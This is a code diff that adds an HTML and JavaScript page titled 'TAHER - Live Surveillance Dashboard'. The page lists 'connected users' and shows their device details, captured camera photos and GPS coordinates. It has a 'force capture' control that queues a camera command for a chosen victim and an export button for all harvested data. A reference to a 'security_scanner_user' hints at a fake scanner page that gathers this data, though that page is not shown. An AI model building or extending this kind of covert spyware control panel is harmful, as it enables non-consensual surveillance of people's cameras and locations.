@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>👑 TAHER - Live Monitoring Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: monospace;
+        }
+        
+        body {
+            background: #000;
+            color: #0f0;
+            padding: 20px;
+        }
+        
+        .header {
+            border-bottom: 2px solid #0f0;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .stats {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .stat-box {
+            background: #111;
+            padding: 15px;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            text-align: center;
+            min-width: 150px;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #0f0;
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            gap: 20px;
+            height: 80vh;
+        }
+        
+        .panel {
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .panel-header {
+            background: #111;
+            padding: 15px;
+            border-bottom: 1px solid #0f0;
+            font-weight: bold;
+        }
+        
+        .panel-content {
+            padding: 15px;
+            height: calc(100% - 50px);
+            overflow-y: auto;
+        }
+        
+        .user-item {
+            padding: 10px;
+            margin: 5px 0;
+            background: #111;
+            border: 1px solid #333;
+            cursor: pointer;
+        }
+        
+        .user-item:hover {
+            border-color: #0f0;
+            background: #222;
+        }
+        
+        .user-active {
+            border-left: 4px solid #0f0;
+        }
+        
+        .log-item {
+            padding: 8px;
+            margin: 5px 0;
+            background: #111;
+            border-left: 3px solid #0f0;
+            font-size: 12px;
+        }
+        
+        .log-camera {
+            border-left-color: #ff0;
+        }
+        
+        .log-location {
+            border-left-color: #0ff;
+        }
+        
+        .log-audio {
+            border-left-color: #f0f;
+        }
+        
+        .camera-view {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            margin: 10px 0;
+            border: 1px solid #0f0;
+        }
+        
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 10px;
+            margin: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        button:hover {
+            background: #0c0;
+        }
+        
+        button.red {
+            background: #f00;
+            color: #fff;
+        }
+        
+        .photo-preview {
+            max-width: 100%;
+            max-height: 150px;
+            border: 1px solid #0f0;
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>👑 TAHER - LIVE SURVEILLANCE DASHBOARD</h1>
+        <div class="stats">
+            <div class="stat-box">
+                <div class="stat-value" id="totalUsers">0</div>
+                <div>TOTAL USERS</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="activeUsers">0</div>
+                <div>ACTIVE NOW</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="totalPhotos">0</div>
+                <div>PHOTOS CAPTURED</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="dashboard">
+        <!-- LEFT: USER LIST -->
+        <div class="panel">
+            <div class="panel-header">👥 CONNECTED USERS</div>
+            <div class="panel-content" id="userList">
+                <!-- Users will load here -->
+            </div>
+        </div>
+        
+        <!-- RIGHT: LIVE MONITORING -->
+        <div class="panel">
+            <div class="panel-header">
+                📡 LIVE MONITORING - <span id="selectedUser">Select a user</span>
+            </div>
+            <div class="panel-content">
+                <div id="userDetails">
+                    <p>Select a user from the left to view their live data</p>
+                </div>
+                
+                <div id="cameraSection" style="display: none;">
+                    <h3>📷 Camera Feed</h3>
+                    <div class="camera-view" id="cameraView">
+                        <!-- Camera feed will appear here -->
+                    </div>
+                    <button onclick="forceCamera()">📸 FORCE CAPTURE NOW</button>
+                </div>
+                
+                <div id="locationSection" style="display: none; margin-top: 20px;">
+                    <h3>📍 Location Data</h3>
+                    <div id="locationData">Loading...</div>
+                </div>
+                
+                <div id="photoSection" style="display: none; margin-top: 20px;">
+                    <h3>📸 Captured Photos</h3>
+                    <div id="photoGallery"></div>
+                </div>
+                
+                <div style="margin-top: 30px;">
+                    <button onclick="exportAllData()" class="red">💾 EXPORT ALL DATA</button>
+                    <button onclick="clearAllData()" class="red">💥 DELETE ALL DATA</button>
+                    <button onclick="refreshData()">🔄 REFRESH</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // ============================================
+    // GLOBAL VARIABLES
+    // ============================================
+    let allUsers = {};
+    let selectedUser = null;
+    let refreshInterval = null;
+    
+    // ============================================
+    // LOAD ALL USER DATA
+    // ============================================
+    function loadAllUsers() {
+        const usersData = localStorage.getItem('all_users');
+        if (usersData) {
+            allUsers = JSON.parse(usersData);
+            updateDashboard();
+        }
+        
+        // Also check for individual user data
+        const userKeys = Object.keys(localStorage).filter(key => key.startsWith('user_'));
+        userKeys.forEach(key => {
+            const userData = JSON.parse(localStorage.getItem(key));
+            if (userData && userData.username) {
+                allUsers[userData.username] = userData;
+            }
+        });
+    }
+    
+    // ============================================
+    // UPDATE DASHBOARD DISPLAY
+    // ============================================
+    function updateDashboard() {
+        const userList = document.getElementById('userList');
+        const totalUsers = Object.keys(allUsers).length;
+        
+        document.getElementById('totalUsers').textContent = totalUsers;
+        
+        // Calculate active users (last 5 minutes)
+        const now = Date.now();
+        let activeCount = 0;
+        let photoCount = 0;
+        
+        userList.innerHTML = '';
+        
+        Object.entries(allUsers).forEach(([username, data]) => {
+            const time = new Date(data.timestamp).getTime();
+            const isActive = (now - time) < 300000; // 5 minutes
+            if (isActive) activeCount++;
+            
+            // Count photos
+            if (data.data?.photo) photoCount++;
+            
+            const userDiv = document.createElement('div');
+            userDiv.className = `user-item ${selectedUser === username ? 'user-active' : ''}`;
+            userDiv.innerHTML = `
+                <strong>${username}</strong> ${data.isAdmin ? '👑' : ''}
+                <br>
+                <small>${data.data?.device?.platform || 'Unknown device'}</small>
+                <br>
+                <small>${isActive ? '🟢 ONLINE' : '🔴 OFFLINE'} - ${new Date(data.timestamp).toLocaleTimeString()}</small>
+            `;
+            
+            userDiv.onclick = () => selectUser(username);
+            userList.appendChild(userDiv);
+        });
+        
+        document.getElementById('activeUsers').textContent = activeCount;
+        document.getElementById('totalPhotos').textContent = photoCount;
+        
+        // Auto-refresh every 3 seconds
+        if (!refreshInterval) {
+            refreshInterval = setInterval(loadAllUsers, 3000);
+        }
+    }
+    
+    // ============================================
+    // SELECT USER FOR DETAILED VIEW
+    // ============================================
+    function selectUser(username) {
+        selectedUser = username;
+        updateDashboard();
+        
+        const userData = allUsers[username];
+        if (!userData) return;
+        
+        document.getElementById('selectedUser').textContent = username;
+        
+        // Update user details
+        const detailsDiv = document.getElementById('userDetails');
+        detailsDiv.innerHTML = `
+            <h3>👤 ${username} ${userData.isAdmin ? '(ADMIN)' : ''}</h3>
+            <p><strong>Device:</strong> ${userData.data?.device?.userAgent?.substring(0, 50)}...</p>
+            <p><strong>Screen:</strong> ${userData.data?.device?.screen || 'Unknown'}</p>
+            <p><strong>Language:</strong> ${userData.data?.device?.language || 'Unknown'}</p>
+            <p><strong>Last Active:</strong> ${new Date(userData.timestamp).toLocaleString()}</p>
+        `;
+        
+        // Show camera section if photo exists
+        if (userData.data?.photo) {
+            document.getElementById('cameraSection').style.display = 'block';
+            document.getElementById('photoSection').style.display = 'block';
+            
+            const photoGallery = document.getElementById('photoGallery');
+            photoGallery.innerHTML = `
+                <img src="${userData.data.photo}" class="photo-preview" onclick="showFullPhoto('${userData.data.photo}')">
+                <p>Photo captured at ${new Date(userData.timestamp).toLocaleTimeString()}</p>
+            `;
+        } else {
+            document.getElementById('cameraSection').style.display = 'none';
+            document.getElementById('photoSection').style.display = 'none';
+        }
+        
+        // Show location data
+        if (userData.data?.location) {
+            document.getElementById('locationSection').style.display = 'block';
+            const loc = userData.data.location;
+            if (loc.lat) {
+                document.getElementById('locationData').innerHTML = `
+                    <p><strong>Latitude:</strong> ${loc.lat}</p>
+                    <p><strong>Longitude:</strong> ${loc.lng}</p>
+                    <p><strong>Accuracy:</strong> ${loc.accuracy} meters</p>
+                    <a href="https://maps.google.com/?q=${loc.lat},${loc.lng}" target="_blank" style="color:#0ff;">
+                        📍 View on Google Maps
+                    </a>
+                `;
+            } else {
+                document.getElementById('locationData').innerHTML = 
+                    `<p style="color:#f00;">Location access denied: ${loc.error}</p>`;
+            }
+        } else {
+            document.getElementById('locationSection').style.display = 'none';
+        }
+    }
+    
+    // ============================================
+    // CONTROL FUNCTIONS
+    // ============================================
+    function forceCamera() {
+        if (!selectedUser) {
+            alert('Select a user first!');
+            return;
+        }
+        
+        // Save command to localStorage
+        const command = {
+            type: 'FORCE_CAMERA',
+            user: selectedUser,
+            timestamp: Date.now()
+        };
+        
+        localStorage.setItem(`command_${selectedUser}`, JSON.stringify(command));
+        alert(`Command sent to ${selectedUser}. They will capture photo on next scan.`);
+    }
+    
+    function showFullPhoto(photoData) {
+        const win = window.open();
+        win.document.write(`<img src="${photoData}" style="max-width:100%;">`);
+    }
+    
+    function exportAllData() {
+        const dataStr = JSON.stringify(allUsers, null, 2);
+        const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+        
+        const link = document.createElement('a');
+        link.setAttribute('href', dataUri);
+        link.setAttribute('download', `taher_surveillance_${Date.now()}.json`);
+        link.click();
+        
+        alert(`✅ Exported data for ${Object.keys(allUsers).length} users`);
+    }
+    
+    function clearAllData() {
+        if (!confirm('💥 DELETE ALL DATA? This cannot be undone!')) return;
+        
+        // Clear all user data
+        Object.keys(localStorage).forEach(key => {
+            if (key.startsWith('user_') || key === 'all_users' || key.startsWith('command_')) {
+                localStorage.removeItem(key);
+            }
+        });
+        
+        allUsers = {};
+        updateDashboard();
+        
+        document.getElementById('userDetails').innerHTML = 
+            '<p>All data cleared. Waiting for new users...</p>';
+        
+        alert('✅ All data deleted!');
+    }
+    
+    function refreshData() {
+        loadAllUsers();
+        alert('🔄 Data refreshed!');
+    }
+    
+    // ============================================
+    // INITIALIZATION
+    // ============================================
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('👑 TAHER Dashboard Loaded');
+        
+        // Check if user is TAHER
+        const currentUser = localStorage.getItem('security_scanner_user');
+        if (currentUser?.toUpperCase() !== 'TAHER') {
+            alert('❌ ACCESS DENIED\nOnly TAHER can access this dashboard!');
+            window.location.href = 'index.html';
+            return;
+        }
+        
+        // Load initial data
+        loadAllUsers();
+        
+        // Auto-refresh every 5 seconds
+        setInterval(loadAllUsers, 5000);
+        
+        // Welcome message
+        setTimeout(() => {
+            const firstUser = Object.keys(allUsers)[0];
+            if (firstUser && firstUser.toUpperCase() !== 'TAHER') {
+                selectUser(firstUser);
+            }
+        }, 1000);
+    });
+    
+    // ============================================
+    // KEYBOARD SHORTCUTS
+    // ============================================
+    document.addEventListener('keydown', function(e) {
+        // F5 to refresh
+        if (e.key === 'F5') {
+            e.preventDefault();
+            refreshData();
+        }
+        
+        // Ctrl+E to export
+        if (e.ctrlKey && e.key === 'e') {
+            e.preventDefault();
+            exportAllData();
+        }
+        
+        // Ctrl+D to delete
+        if (e.ctrlKey && e.key === 'd') {
+            e.preventDefault();
+            clearAllData();
+        }
+    });
+    
+    </script>
+</body>
+</html>
